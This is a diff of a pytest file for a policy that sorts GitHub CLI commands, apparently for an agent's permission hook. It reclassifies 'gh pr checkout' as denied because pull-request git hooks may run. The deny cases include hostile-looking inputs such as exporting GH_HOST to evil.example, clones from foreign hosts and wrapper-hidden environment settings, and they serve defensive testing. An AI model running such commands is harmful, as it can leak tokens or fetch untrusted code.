@@ -118,7 +118,6 @@ def reason(command: str) -> str:
         ),
         pytest.param("gh issue comment 1 -R furedea/r -b ok && gh pr list", id="a write in an && list"),
         pytest.param("gh issue develop 1 --list -R other/r", id="a linked branch listing, which reads"),
-        pytest.param("gh pr checkout 12 --detach -b review", id="a checkout with listed options"),
     ],
 )
 def test_reversible_writes_to_a_trusted_owner_are_allowed(command: str) -> None:
@@ -145,11 +144,9 @@ def test_reversible_writes_to_a_trusted_owner_are_allowed(command: str) -> None:
         pytest.param("gh api -X GET search/issues -f q='repo:o/r is:open'", id="a GET with query fields"),
         pytest.param("gh api user", id="a plain REST read"),
         pytest.param("gh api repos/o/r/actions/runs --paginate -H 'Accept: application/json'", id="a header read"),
-        pytest.param("gh pr checkout 12", id="a checkout, which changes only the local repository"),
         pytest.param("gh repo clone furedea/agent-config", id="a clone"),
         pytest.param('gh run watch "$R" --repo furedea/agent-config --exit-status 2>&1', id="a quoted run id"),
         pytest.param('gh pr view "$n" --json number,state --jq .state', id="a quoted PR number"),
-        pytest.param("gh pr checkout user/feat/x", id="a checkout of a branch with slashes"),
         pytest.param("gh repo view furedea/agent-config", id="a repository view by owner and name"),
         pytest.param("gh pr view release/v1.2/x", id="a PR view of a branch with dots and slashes"),
         *(
@@ -294,7 +291,9 @@ def test_reads_and_local_changes_are_allowed_in_any_form(command: str) -> None:
         pytest.param(
             'export GH_"HOST"=evil.example; gh api -X GET user', "environment", id="a quoted variable name exported"
         ),
-        pytest.param("gh pr checkout 1 --foo", "operation table", id="an unlisted checkout option"),
+        pytest.param(
+            "gh pr checkout 12", "operation table", id="a checkout, whose git hooks may come from the pull request"
+        ),
         pytest.param("GH_REPO=other/r gh issue comment 1 -b x", "environment", id="GH_REPO on the line"),
         pytest.param("env GH_REPO=other/r gh issue comment 1 -b x", "environment", id="GH_REPO through env"),
         pytest.param("timeout 9 gh issue comment 1 -b x", "environment", id="a wrapper hiding the environment"),
@@ -315,7 +314,6 @@ def test_reads_and_local_changes_are_allowed_in_any_form(command: str) -> None:
         ),
         pytest.param("gh pr view $n --json number,state", "may split", id="logged PR view by an unquoted number"),
         pytest.param("gh pr list $ARGS", "may split", id="read options from an unquoted parameter"),
-        pytest.param("gh pr checkout 1 --recurse-submodules", "operation table", id="a checkout with submodules"),
         pytest.param(
             "gh issue develop --list 1 -R evil.example/o/r", "another host", id="a branch list on another host"
         ),
@@ -334,10 +332,6 @@ def test_reads_and_local_changes_are_allowed_in_any_form(command: str) -> None:
         pytest.param("gh repo clone https://evil.example/o/r", "another host", id="a clone from a foreign URL"),
         pytest.param("gh repo clone evil.example/o/r", "another host", id="a clone from a foreign host"),
         pytest.param("gh repo clone furedea/$X", "run time", id="a clone named at run time"),
-        pytest.param("gh pr checkout 1 -R evil.example/o/r", "another host", id="a checkout from a foreign host"),
-        pytest.param(
-            "gh pr checkout https://evil.example/o/r/pull/1", "another host", id="a checkout of a foreign URL"
-        ),
         pytest.param("gh pr review 42 -b 'Looks good'", "needs one of", id="a review body without an action"),
         pytest.param("gh pr close 42 -d", "class D", id="a close that deletes the branch"),
         pytest.param("gh pr comment 42 --delete-last --yes", "needs one of", id="a comment deletion"),
